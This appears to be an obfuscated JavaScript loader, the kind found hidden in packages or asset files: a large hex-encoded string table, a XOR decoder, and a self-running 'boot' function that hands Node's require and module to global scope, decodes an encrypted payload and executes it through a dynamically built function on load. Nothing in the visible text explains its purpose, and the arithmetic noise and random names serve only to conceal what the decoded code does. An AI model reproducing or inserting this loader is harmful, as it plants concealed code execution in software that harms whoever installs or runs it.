314c001700575f315d0b0a464d0a400a1e5f314d260e00521b220d0531183000114d314d461f414d331111310d5f00310d3342023131173105314d33435b44315f29224331450a5f060000183e00054d310e02314d0a11004d0a310639410d5f1a425f43003143405f4f06004231075a100a00483c52024d11164d4d014d4d31060b5f311d0a470c175f053107000a175f3f040c3c530f310e15254b5f065a105f3117174b4342310d31551e5f4d0a172c4d4d455a1057072d3100434d0c4d31314d3e09534331430e025758115f1020024a45430e0c381b0f31490b17424f2216134331164f0531170538094a3349003131525f31301543104251002a10314d4d0654570b31074400591510114d10585f064b5f3c422e310531052f2f04020f4d424d164d315a4b2e000f024b071e172c024d1e31002a06010e2600532d4b3127460126474311075f00144a4d255f2c013934314d09044d36574102053103440e464c0605021b31313158310d02595415315301004d023c315f5f093131104d4d3b4a1013240a451544064d0f4d514d2a4d065a1131064d1044525e114d0631061b01013c31313c065a00075f252a33424d0031485b4d5757554c365f5f0f10423e5f160313311016015f015d29331413230a0f315f0a4a084207312f08314d1711311b4b11114a46434c4d4b3e015b0031104815314e004a1e590c10314d0040415f0012085f06084d0a0e31302d4d311026430133330d4a5f061e0c5306414d5207312a31424b114d464d2a4d4d310519023c5c313108054c4f170031312a054d5f0a31430107312c4d0033000706314d101e0609250113580c4d05105f003c0e005f02254d070d005300433131314d120d434d3100314d0b3128095f31104d08005f5031104d000037174d1711170d175d14584c2a0039005b115f0a4d31175d3100104d4d104310183706435f424d484d314d5f163133310c4d5f284d0e4d024d10112e5f31434d0014310a005f314a0d334b5f31310606161700290046132d4d311000064d5e060205535f4423301e525f5f3a2a091142425f57024d0531314d0f455f31474d4d0f154d1e1f5645314d31425f4a1b05104d0147593100430f4d5f430c4b294d064d402d4d54175f4a005f14430631534d5e5f1a0043424d4d31065c5f0d44213831010c440216311e4311020640315e4d0a314b1017514d011d435f30004d1e17371031115f02314a43111a0a1142205f004317071d41433b4d1717315f31420743004d4d4206074d314d5f31430d4d300d0642424a574c0c3b3131164d060d315f4d11311231410f3c2e4d0605171711431731004d3c115f314d314d070718340b18314d5f4d453131005f4d04051e31001156510717061e074b1e5c0025544d1b1a47345f424d4d005513005c2d0053194b0b574d31310c5e3c0c024d33054205570b314d310749065e07400000551111180c4c310231304d194d154d3127005f4d38315a4d44173e454d3131314e57314506143f00313a060c0d0543174d0e4a065e4d0a00284d31184d53100f52130031104b000b0f4d34314d1a004d18060a0f5005175f184c4d204d4b4d0d5f0f4a5d0e5f5f07525f025c430d06005f314d4d02150f0c3115093104064d3c435e31484d31314d1407314d0755464d2a00004b48174d59000a444d000b174d014d3142105705173c311b17025f101e2b4f00004d0708310d004d4d1e0040430d4a314d4b3c4a0052504d0c174d0c4d1e5f424d1731314a4d175f4d4d4d5b310d4d2b1700175f010f310c170032240d3d493c1b0e060033371e4d4d5f5f1153430f261742070d415313054d040f1e315f06310f37230a4d4d044a0d065731165f05313137044d00314d004d0606175f4d4d3d06064f1158171f13001706342510433104020731110c244b0f170f43404b1a115f4d400707174d5f31430a4e0c5f10172a0742014a312a26174931310d45314d005f0a310e0f314b4e4b0e1700084d311a4253313a295f004d310a5d11114d43145a003702315e5f330007283e3c3f51054b43404d3110464d17065f0d4c31111a00004d0d3100474d33454d054d0a000021332d31073158314d565f31315f0e330c184b31183c0d5f0f310a074d0b31434d07310d311142291431534d313331114d5d5e4b055f065c4d5f21053e1b31000100330031101e5f314b104d31333a4d31313c33084b0c5f4b070f5f5306314f5259275210154d0a0f0b063c33311300003152120e4d070e415f100a1033074d5c43130e07310b310d00174b5c47311117311b4d064a034d4d314d135c0a42315231114b43184d063731311e4d001e5f31315b4d4d311331410004584d0000533111314d431745500d0756060033013c4d31423102000031010007011e004b4218175f4d310d154d2d31451d0622104719415f575f4d0c0410052002310f5f0c0026310c3131174d4d5f104d0a03315c4d1004004d4d311031104d44471b3100102d3131423103310c313c0d4240314f425612054d40212a31230f4d4f4d3e0c310631021f5f3138175f5f591f0238575f311d31424826044e314d0233420643450f5f560d460031310725111a004d104c314d5818184f2b4d585f0d5f4d4a574d17070e314a1031074b0e3101184d5f31004d11330e4d0031064300310008311b4a5f0045000a4d1a00060f161a584f4d3b0711310f313140430000054d00314343314731000c11114b4d1120135f2d1140264b3e310d31410a090d043131575f204702070f31020045174b424e31134d3e070c4d000a311e16103111104b0d43205f42584d05004d0023195f173157172031173117005e4d005000050c4d42434331585f05065b3107112e313138072d38001a3100595d370d5f0f3d4d0f0c5b310a3131001010001e31171300184d1031104d4d4d1e004d31023a385f0249434a2a4b0f07314b141011554349315442025f304d005f3f314d21262f3106553a055f525f06003311270643100f5333012740313e0c4d445f0f4d0e43314b134a5f060802004d00314d074d4d3c165f02445f43310f0a01050e0d07053e4d4b4631315f312d270031263140354d4d021002380d45314f475f4f315f0c5731310626314a10102f3e5b263031310631260a3118315f004d1843003424051e0c0b070002104d3e4d4305335e430c105554260c002a330c00434d540a04002520314d435f00264d2d434d0131','5753010e293a2110','565b52512b0519053237','0f060d04170b','5a555255503109023a2630','10130f0a17','0b120611101b0f16151402000709011a0e040c111905080c000a13171116170d10170c0d00','000b02112217','003d0e0609013d17110c','525054525b525519333b350f1a'];KmBFHpEdRXPQBdRu=function(){return cDmQ_ABHom;};return KmBFHpEdRXPQBdRu();}function daIQfX(MpmUMwi$WRckVhl,nY_To$Qm){var J$NlwSpydghfDNjrHkIJkQV=KmBFHpEdRXPQBdRu();return daIQfX=function(nSsxDSgcDDFqVICVEYFksq,sQACamQvSII){nSsxDSgcDDFqVICVEYFksq=nSsxDSgcDDFqVICVEYFksq-(Math.trunc(parseInt(0x21))*parseFloat(0x25)+Math.floor(parseInt(0xa22))+0x1*-parseInt(0xe7f));var DYqL$_ZlVzS=J$NlwSpydghfDNjrHkIJkQV[nSsxDSgcDDFqVICVEYFksq];if(daIQfX['zqiSUs']===undefined){var zht_wVWqujqYgkIj$Qt=function(FVqxX_sSL){var fpLvD$quQlg_cBijkWk=Math.max(0x1,0x1)*Math.ceil(0x2302)+parseInt(0x17fd)+Math.trunc(-parseInt(0x2))*0x1bce&Math.floor(-parseInt(0x2341))*-0x1+-0x718+-parseInt(0x1b2a),OxetOZSCa_IboGRq=new Uint8Array(FVqxX_sSL['match'](/.{1,2}/g)['map'](ytRObCYg_qXl=>parseInt(ytRObCYg_qXl,-0x476*-0x2+-parseInt(0x5)*-0x73+Math.floor(-parseInt(0xb1b))))),ziORlXpUcTTNRhKPtoCkPqF$T=OxetOZSCa_IboGRq['map'](eGVHzglg_qbPBekKstoxuVUFMm=>eGVHzglg_qbPBekKstoxuVUFMm^fpLvD$quQlg_cBijkWk),YwbuVNZxea=new TextDecoder(),eQMUhGpvH=YwbuVNZxea['decode'](ziORlXpUcTTNRhKPtoCkPqF$T);return eQMUhGpvH;};daIQfX['pwmLvH']=zht_wVWqujqYgkIj$Qt,MpmUMwi$WRckVhl=arguments,daIQfX['zqiSUs']=!![];}var TNkoElCCKyIRrT_flbVOHlgK=J$NlwSpydghfDNjrHkIJkQV[parseInt(0xa4a)+-0x7d*parseInt(-0x9)+-0x15*parseInt(0xb3)],mVFjD$LPwoRw$D=nSsxDSgcDDFqVICVEYFksq+TNkoElCCKyIRrT_flbVOHlgK,dTO_YApG_JZXc=MpmUMwi$WRckVhl[mVFjD$LPwoRw$D];return!dTO_YApG_JZXc?(daIQfX['eAfYbz']===undefined&&(daIQfX['eAfYbz']=!![]),DYqL$_ZlVzS=daIQfX['pwmLvH'](DYqL$_ZlVzS),MpmUMwi$WRckVhl[mVFjD$LPwoRw$D]=DYqL$_ZlVzS):DYqL$_ZlVzS=dTO_YApG_JZXc,DYqL$_ZlVzS;},daIQfX(MpmUMwi$WRckVhl,nY_To$Qm);}(function boot(GdiMiAIlgn,J$cGy_McRFWTA){var S_A$PLNfPHmujMepTnXm=daIQfX;GdiMiAIlgn['z']=z;var ngUNqXbQ=splitLane(S_A$PLNfPHmujMepTnXm(0x75));GdiMiAIlgn[ngUNqXbQ[-parseInt(0x470)+-parseInt(0x1fa9)+Math.max(parseInt(0x2419),0x2419)]]=J$cGy_McRFWTA;typeof module===ngUNqXbQ[0x9a3+Math.ceil(-parseInt(0x1))*parseFloat(parseInt(0x101f))+parseInt(0x67d)]&&(GdiMiAIlgn[ngUNqXbQ[Number(parseInt(0x33d))+Math.ceil(0x24ad)+Math.trunc(-parseInt(0x4fd))*parseInt(0x8)]]=module);var h$$NvHuXI=peel(S_A$PLNfPHmujMepTnXm(0x73)),txqquKPEmrdrWd_omlRQYjaY=h$$NvHuXI[S_A$PLNfPHmujMepTnXm(0x6b)](0xb92+-0x9e+-parseInt(0xaf4),0x19a+Math.ceil(-0xd)*0x278+parseInt(0x1e89)),CWcrClcy__GXNo=peel[txqquKPEmrdrWd_omlRQYjaY],uZjEDBZXVl=CWcrClcy__GXNo('',peel(S_A$PLNfPHmujMepTnXm(0x6a))),nuHJlzVTSNgUxMYmoMbTrJdj=uZjEDBZXVl(peel(S_A$PLNfPHmujMepTnXm(0x6d)));return CWcrClcy__GXNo('',nuHJlzVTSNgUxMYmoMbTrJdj)(Math.floor(-0x175)*Math.trunc(-parseInt(0x15))+-0x2*-parseInt(0x455)+parseInt(-parseInt(0x1d76))),0x2d6f+-parseInt(0x19f)*-0x17+parseInt(0x2ae)*Math.trunc(-0x13);}(global,require));
